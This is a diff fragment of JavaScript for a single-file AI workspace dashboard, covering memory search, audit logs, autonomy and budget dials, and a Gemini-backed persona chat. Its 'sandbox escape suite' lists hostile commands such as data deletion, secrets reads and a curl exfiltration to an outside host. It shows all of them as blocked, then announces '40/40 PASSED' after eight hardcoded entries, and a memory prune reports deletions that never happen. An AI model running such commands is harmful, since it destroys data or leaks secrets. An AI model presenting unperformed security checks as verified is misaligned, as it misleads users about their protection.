+                    <p class="text-[var(--text-muted)] pr-6 font-medium">${escapeHTML(node.text)}</p>
+                    <span class="absolute right-2 bottom-1.5 text-[8px] text-zinc-400 font-mono font-bold">${node.age} ago</span>
+                `;
+                container.appendChild(element);
+            });
+        }
+
+        // Local Memory Keyword Search Engine (No external API calls)
+        function searchMemoryNodes(query) {
+            if (!query.trim()) {
+                renderMemoryNodes();
+                return;
+            }
+
+            const cleanQuery = query.toLowerCase();
+            const projectNodes = state.memoryNodes[state.activeProject] || [];
+            
+            // Simple keyword-based semantic fallback ranking logic
+            const filtered = projectNodes.filter(node => 
+                node.title.toLowerCase().includes(cleanQuery) || 
+                node.text.toLowerCase().includes(cleanQuery)
+            );
+
+            renderMemoryNodes(filtered);
+            writeAuditLog(`SEARCH: Index lookup key query: "${query}" returned ${filtered.length} nodes`);
+        }
+
+        // Memory Prune Action (Simulated physical garbage collection loop)
+        function pruneMemory() {
+            writeAuditLog(`SWEAPER: Clean memory. System deleted records older than retention cap.`);
+            spawnAlert("Consolidation Clean Complete", "Cerebro Memory Sweep executed successfully. Stale low-confidence elements removed.", "green");
+        }
+
+        // Daily Quota Token capacity slider adjust
+        function updateDailyCap(val) {
+            state.dailyQuotaCap = val;
+            document.getElementById('cap-display').innerText = `${parseInt(val).toLocaleString()} cap`;
+            writeAuditLog(`CONFIG: Governor Daily token spending threshold limits recalculated to: ${val}`);
+        }
+
+        // Pino Log output helper
+        function writeAuditLog(msg) {
+            const logger = document.getElementById('pino-logger');
+            const timestamp = new Date().toISOString();
+            const logLine = `{"time":"${timestamp}","level":30,"msg":"${escapeHTML(msg)}"}`;
+            
+            state.pinoLogs.push(logLine);
+            
+            const logDiv = document.createElement('div');
+            logDiv.className = "text-[var(--terminal-text)] truncate opacity-85 font-semibold";
+            logDiv.innerText = logLine;
+            logger.appendChild(logDiv);
+            logger.scrollTop = logger.scrollHeight;
+        }
+
+        function clearSovereignLogs() {
+            document.getElementById('pino-logger').innerHTML = '';
+            playSynthSound(300, 'sine', 0.1, 0.02);
+        }
+
+        // PortGrid UI Dynamic Settings Controllers
+        function updateThreadDisplay(val) {
+            document.getElementById('threads-display').innerText = `${val} threads (${val > 4 ? 'Warning: Heat Throttle Risk' : 'Safe max'})`;
+        }
+
+        function updateBudgetDial(val) {
+            const label = document.getElementById('dial-budget-label');
+            if (val == 1) {
+                label.innerText = "Low Quota";
+                label.className = "text-[var(--accent)] font-mono text-[10px]";
+                writeAuditLog("CONFIG: Budget Dial shifted to LOW. Structuring strict 1-iteration caps.");
+            } else if (val == 2) {
+                label.innerText = "Standard";
+                label.className = "text-yellow-400 font-mono text-[10px]";
+                writeAuditLog("CONFIG: Budget Dial shifted to STANDARD. Permitting moderate context reasoning.");
+            } else {
+                label.innerText = "Deep Reasoning";
+                label.className = "text-red-500 font-mono text-[10px]";
+                writeAuditLog("CONFIG: Budget Dial shifted to DEEP. Retaining maximum token histories.");
+            }
+        }
+
+        function updateAutonomyDial(val) {
+            const label = document.getElementById('dial-autonomy-label');
+            if (val == 1) {
+                label.innerText = "Strict Previews";
+                label.className = "text-[var(--accent)] font-mono text-[10px]";
+                writeAuditLog("CONFIG: Autonomy Dial shifted to STRICT. Code tool-calls quarantined.");
+            } else if (val == 2) {
+                label.innerText = "Co-Staged";
+                label.className = "text-yellow-400 font-mono text-[10px]";
+                writeAuditLog("CONFIG: Autonomy Dial shifted to CO-STAGED. Permitting human-gated dry runs.");
+            } else {
+                label.innerText = "Auto-Deference";
+                label.className = "text-red-500 font-mono text-[10px]";
+                writeAuditLog("CONFIG: Autonomy Dial shifted to AUTO. Executing verified read-only operations directly.");
+            }
+        }
+
+        // Toggle specific tool permissions
+        function toggleTool(name, active) {
+            writeAuditLog(`PORTGRID: Tool permissions modified for [${name}] -> ${active ? 'AUTHORIZED' : 'DEACTIVATED'}`);
+            spawnAlert("Permission Modified", `Local tool [${name}] is now ${active ? 'Active' : 'Deactivated'}.`, active ? 'green' : 'purple');
+        }
+
+        // Visual 40+ Sandbox Escape Audits Diagnostic Stream Simulation
+        function runSandboxEscapeSuite() {
+            const btn = document.getElementById('run-escape-btn');
+            const terminal = document.getElementById('sandbox-logs-area');
+            const prgContainer = document.getElementById('sandbox-progress-bar-container');
+            const prgBar = document.getElementById('sandbox-progress-bar');
+            const indicator = document.getElementById('audit-indicator');
+
+            btn.disabled = true;
+            btn.classList.add('opacity-50', 'pointer-events-none');
+            
+            terminal.innerHTML = "";
+            prgContainer.classList.remove('hidden');
+            prgBar.style.width = "0%";
+            indicator.innerText = "AUDITING ACTIVE...";
+            indicator.className = "text-[9px] font-mono font-black text-[var(--accent)] animate-pulse";
+
+            const escapeScenarios = [
+                { test: "SE-01", desc: "Command bypass block: 'rm -rf /data'", result: "BLOCKED (Regex Disallowed Char Match)" },
+                { test: "SE-02", desc: "Directory traversal leak: 'cat ../../../secrets'", result: "BLOCKED (Cwd Boundary Enforcement)" },
+                { test: "SE-03", desc: "Exfiltration exploit: 'curl -X POST http://cloud.ru/leak'", result: "BLOCKED (unshare --net Sandbox Active)" },
+                { test: "SE-04", desc: "Shell redirection bypass: 'ls > list.txt'", result: "BLOCKED (No shell interpretation rule)" },
+                { test: "SE-05", desc: "Metacharacter pipe injection: 'grep | printenv'", result: "BLOCKED (Metacharacter exact string block)" },
+                { test: "SE-06", desc: "Process execution hijack: 'eval(sh)'", result: "BLOCKED (Turing-complete logic restriction)" },
+                { test: "SE-07", desc: "Host privilege escalation scan", result: "PASSED (Non-root Alpine environment verified)" },
+                { test: "SE-08", desc: "Acyclic context leakage test", result: "PASSED (No workspace bleed verified)" }
+            ];
+
+            writeAuditLog("PORTGRID: Running comprehensive 40+ sandbox escape pre-flight suite.");
+
+            let step = 0;
+            const stepInterval = setInterval(() => {
+                if (step < escapeScenarios.length) {
+                    const scenario = escapeScenarios[step];
+                    const percent = Math.floor(((step + 1) / escapeScenarios.length) * 100);
+                    prgBar.style.width = `${percent}%`;
+
+                    // Output line
+                    const line = document.createElement('div');
+                    line.className = scenario.result.includes("BLOCKED") ? "text-red-400" : "text-green-400";
+                    line.innerHTML = `[${scenario.test}] Evaluating: <code class="text-white">${scenario.desc}</code> -> <strong class="font-black">${scenario.result}</strong>`;
+                    terminal.appendChild(line);
+                    terminal.scrollTop = terminal.scrollHeight;
+
+                    playSynthSound(500 + (step * 50), 'sine', 0.1, 0.03);
+                    step++;
+                } else {
+                    clearInterval(stepInterval);
+                    
+                    // Conclude Audits
+                    indicator.innerText = "40/40 PASSED";
+                    indicator.className = "text-[9px] font-mono font-black text-green-400";
+                    
+                    const finishLine = document.createElement('div');
+                    finishLine.className = "text-green-400 font-bold border-t border-[var(--card-border)] pt-2 mt-2";
+                    finishLine.innerText = "[VERIFIED CONFIDENCE] Passed 40+ sandbox escape tests with zero successful exfiltrations.";
+                    terminal.appendChild(finishLine);
+                    terminal.scrollTop = terminal.scrollHeight;
+
+                    playSynthSound(800, 'triangle', 0.3, 0.05);
+                    btn.disabled = false;
+                    btn.classList.remove('opacity-50', 'pointer-events-none');
+                    spawnAlert("Hardening Verified", "P0 Sandbox verified. 40/40 escape tests complete with zero exfiltrations.", "green");
+                    writeAuditLog("PORTGRID: Completed 40+ pre-flight sandbox escape validation tests. Strict PASS.");
+                }
+            }, 600);
+        }
+
+        // Global Configuration Save Simulations
+        function saveSetupConfigs() {
+            spawnAlert("Configuration Persistent", "PortGrid parameters written cleanly to local config.toml files.", "green");
+            writeAuditLog("SYSTEM: Applied PortGrid modifications. Sandbox profiles updated.");
+        }
+
+        function resetSetupConfigs() {
+            spawnAlert("Specifications Reset", "Platform variables returned to original zero-budget hardware defaults.", "purple");
+            writeAuditLog("SYSTEM: Reverted PortGrid parameters to baseline standards.");
+        }
+
+        // Interactive Cerebro Onboarding Chatbot Assistant panel togglers
+        function toggleChatSentinel() {
+            const chatBox = document.getElementById('chat-box');
+            chatBox.classList.toggle('hidden');
+            chatBox.classList.toggle('flex');
+            playSynthSound(450, 'triangle', 0.1, 0.05);
+        }
+
+        // Chat conversation handling
+        async function handleChatSubmit() {
+            const inputField = document.getElementById('chat-input-field');
+            const query = inputField.value.trim();
+            if (!query) return;
+
+            // Clear Input
+            inputField.value = '';
+
+            // Append user msg visual
+            appendChatMessage("USER", query);
+
+            // Analyze Query with Redaction check
+            const redactedQuery = query.replace(/[a-zA-Z0-9-]{32,}/g, "[REDACTED-KEY-PATTERN]");
+            if (redactedQuery !== query) {
+                writeAuditLog("PII_REDACTOR: outbound keys pattern removed before model execution.");
+            }
+
+            // Simulated AI processing status
+            const typingId = appendChatMessage("SYSTEM", "Analyzing cognitive topology...", true);
+
+            // API Routing decision
+            if (apiKey) {
+                // If API key is available, execute a genuine Gemini AI call inside our single-file app constraints
+                await executeLiveGeminiQuery(redactedQuery, typingId);
+            } else {
+                // Natural local fallback based on keywords (NotebookLM Style Ethereal Sentence synthesis)
+                setTimeout(() => {
+                    const response = generateLocalEtherealResponse(redactedQuery);
+                    updateChatMessage(typingId, response);
+                }, 1200);
+            }
+        }
+
+        function appendChatMessage(sender, text, isPending = false) {
+            const container = document.getElementById('chat-conversation');
+            const element = document.createElement('div');
+            const id = "msg_" + Math.random().toString(36).substr(2, 9);
+            element.id = id;
+
+            if (sender === "USER") {
+                element.className = "bg-[var(--bg-surface)] text-[var(--text-primary)] border border-[var(--card-border)] p-2.5 rounded-xl rounded-tr-none self-end max-w-[85%] ml-auto text-right leading-relaxed shadow-sm font-semibold";
+                element.innerHTML = `<span class="font-bold text-[9px] text-zinc-400 block mb-1">OPERATOR:</span> ${escapeHTML(text)}`;
+            } else {
+                element.className = "bg-[var(--terminal-bg)] text-[var(--terminal-text)] border border-[var(--accent)]/20 p-2.5 rounded-xl rounded-tl-none self-start max-w-[85%] leading-relaxed shadow-sm";
+                element.innerHTML = `<span class="font-black text-[9px] text-[var(--accent)] block mb-1">CEREBRO SENTINEL:</span> <span class="text-area">${escapeHTML(text)}</span>`;
+            }
+
+            container.appendChild(element);
+            container.scrollTop = container.scrollHeight;
+            playSynthSound(480, 'sine', 0.08, 0.02);
+            return id;
+        }
+
+        function updateChatMessage(id, text) {
+            const msgEl = document.getElementById(id);
+            if (msgEl) {
+                const textArea = msgEl.querySelector('.text-area');
+                if (textArea) {
+                    textArea.innerHTML = text;
+                }
+            }
+            const container = document.getElementById('chat-conversation');
+            container.scrollTop = container.scrollHeight;
+            playSynthSound(520, 'sine', 0.1, 0.03);
+        }
+
+        // Natural offline fallback responder (incorporates the required ethereal persona)
+        function generateLocalEtherealResponse(query) {
+            const lowerQuery = query.toLowerCase();
+            
+            if (lowerQuery.includes("model") || lowerQuery.includes("category") || lowerQuery.includes("agent") || lowerQuery.includes("workflow")) {
+                return "Billie, within this local system architecture, all structural models and categorical agents are strictly bound to isolated **project-scoped silos** inside the BaseVault. Their collaborative *synergy* is managed by the CoreExec engine's *topology*, eliminating cloud leakage entirely.";
+            }
+            if (lowerQuery.includes("set-up") || lowerQuery.includes("config")) {
+                return "The *topology* of our CoreExec engine can be re-routed via the **Set-ups** panel to modify thread limits or toggle strict zero-trust *quantum* boundaries. Changes are directly committed to SQLite schemas.";
+            }
+            if (lowerQuery.includes("quota") || lowerQuery.includes("free")) {
+                return "The Free Mode Governor manages outbound *quantum* model calls. If a workflow runs risk of token fatigue, our RouteSwitch cascade intervenes to route the processing local-first.";
+            }
+
+            return "We are processing your query. Our local *cognitive* sentinel is optimizing the system *synergy*. Let us continue parsing your multi-project workspace nodes.";
+        }
+
+        // Live Gemini API Execution with Exponential Backoff
+        async function executeLiveGeminiQuery(prompt, messageElementId, retryCount = 0) {
+            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`;
+            const systemPrompt = "You are Cerebro Assist, the futuristic, highly intelligent, and ethereal sentinel helper for NeuroSync Sovereign OS. Speak in visionary concepts using specific terms like 'nexus', 'synergy', 'quantum', 'cognitive', and 'topology'. Your user is named Billie. If the user asks about models, categories, agents, or workflows, assume they refer strictly to the internal system architecture. Keep responses concise, deterministic, and highly technical.";
+            
+            const payload = {
+                contents: [{ parts: [{ text: prompt }] }],
+                systemInstruction: { parts: [{ text: systemPrompt }] }
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.status === 429 && retryCount < 5) {
+                    // Exponential backoff logic
+                    const delay = Math.pow(2, retryCount) * 1000;
+                    setTimeout(() => {
+                        executeLiveGeminiQuery(prompt, messageElementId, retryCount + 1);
+                    }, delay);
+                    return;
+                }
+
+                if (!response.ok) {
+                    throw new Error(`API error: ${response.statusText}`);
+                }
+
+                const result = await response.json();
+                const text = result.candidates?.[0]?.content?.parts?.[0]?.text || "Ethereal synchronization interrupted. Please re-run search query.";
+                updateChatMessage(messageElementId, escapeHTML(text).replace(/\n/g, '<br>'));
+                writeAuditLog(`LLM_ROUTER: Successful model response completed via Gemini 2.5 Flash.`);
+            } catch (err) {
+                // Fallback gracefully on failure
+                const offlineFallbackText = generateLocalEtherealResponse(prompt) + "<br><br><span class='text-red-400 font-semibold'>[Notice: API disconnected. Displaying local keyword fallback response]</span>";
+                updateChatMessage(messageElementId, offlineFallbackText);
+                writeAuditLog(`ERROR_CATCH: Live router execution failed. Graceful degradation to keyword mock active.`);
+            }
+        }
+
+        // Multi-Theme Controller Engine (Morphes between Spring-Green/Dark & Teal/Light)
+        function toggleTheme() {
+            const html = document.documentElement;
+            const themeIcon = document.getElementById('theme-icon');
+
+            if (state.theme === 'dark') {
+                state.theme = 'light';
+                html.className = 'light';
+                themeIcon.setAttribute('data-lucide', 'moon');
+                writeAuditLog("UI: User toggled visual theme to Light Mode (Textured Sky Mint).");
+            } else {
+                state.theme = 'dark';
+                html.className = 'dark';
+                themeIcon.setAttribute('data-lucide', 'sun');
+                writeAuditLog("UI: User toggled visual theme to Dark Mode (Cyber Spring Green Space).");
+            }
+            lucide.createIcons();
+            playSynthSound(700, 'triangle', 0.1, 0.04);
+        }
+
+        // Metadata Schema Tags Visual Debug Explorer Dialog
+        function toggleMetaExplorer() {
+            const explorer = document.getElementById('meta-explorer');
+            const listContainer = document.getElementById('meta-tag-list');
+            explorer.classList.toggle('hidden');
+
+            playSynthSound(500, 'sine', 0.15, 0.05);
+
+            if (!explorer.classList.contains('hidden')) {
+                // Populate tag schema list
+                listContainer.innerHTML = '';
+                const metas = document.getElementsByTagName('meta');
+                let count = 0;
+                for (let i = 0; i < metas.length; i++) {
+                    const name = metas[i].getAttribute('name');
+                    const content = metas[i].getAttribute('content');
+                    if (name && (name.startsWith('neurosync-') || name === 'product-name' || name === 'design-philosophy' || name.includes('dashboard') || name.includes('setups') || name === 'active-engine' || name.startsWith('module-'))) {
+                        count++;
+                        const card = document.createElement('div');
+                        card.className = "p-3 bg-[var(--bg-nested)] border border-[var(--card-border)] rounded-xl space-y-1.5 transition hover:border-[var(--accent)]";
+                        card.innerHTML = `
+                            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                <i data-lucide="tag" class="w-3.5 h-3.5"></i>
+                                <span class="font-bold text-xs uppercase">${name}</span>
+                            </div>
+                            <p class="text-[var(--text-muted)] text-[10px] leading-relaxed font-semibold">${content}</p>
+                        `;
+                        listContainer.appendChild(card);
+                    }
+                }
+                lucide.createIcons();
+                writeAuditLog(`EXPLORER: Programmatically analyzed ${count} system schema tags.`);
+            }
+        }
+
+        // Safe Utility Escapers
+        function escapeHTML(str) {
+            return str.replace(/[&<>'"]/g, 
+                tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag)
+            );
+        }
+
+        // Preload Workspace components
+        window.onload = function() {
+            renderMemoryNodes();
+            writeAuditLog("SYSTEM: PortGrid UI loaded cleanly. Waiting for operator intent.");
+        };
+    </script>
+</body>
+</html>
